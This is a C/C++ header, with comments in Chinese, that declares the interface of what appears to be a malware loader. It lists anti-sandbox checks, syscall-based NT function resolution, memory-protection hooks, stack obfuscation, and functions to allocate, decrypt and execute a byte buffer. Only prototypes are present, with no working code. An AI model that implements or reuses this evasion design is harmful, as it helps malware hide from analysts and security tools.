#pragma once
#pragma once
#include "struct.h"


extern "C" BOOL FindNtFunctions();
extern "C" BOOL  FindNtFunctionsBySyscall();



/*
反沙箱模块
 1. 检测时间流逝
 2. 检测CPU和内存大小
 3. 检查系统语言环境
 4. 检查进程信息
*/

extern "C" BOOL check_time_acceleration();

extern "C" BOOL check_CPUandMem();

extern "C" BOOL AntiSandbox_LanguageCheck();

extern "C" BOOL check_known_processes();

extern "C" BOOL check_ip();


//hook

extern "C" BOOL ExportSetupMemoryProtection();

// 仅需传入已初始化的 NT 函数指针
// 如果你打算把 PNtFunctions 的初始化也封装进库，甚至这个参数也可以去掉
extern "C" BOOL ExportSetupStackObfuscation();


extern "C" BOOL allocMemFunc(unsigned char data1[], SIZE_T size, pChooseMemNtFunc ChooseNtFuncs);

extern "C" BOOL excuteFunc(PChooseExeMethod exemethod);

extern "C" VOID decrypt_buffer(DecryptStruct * cfg);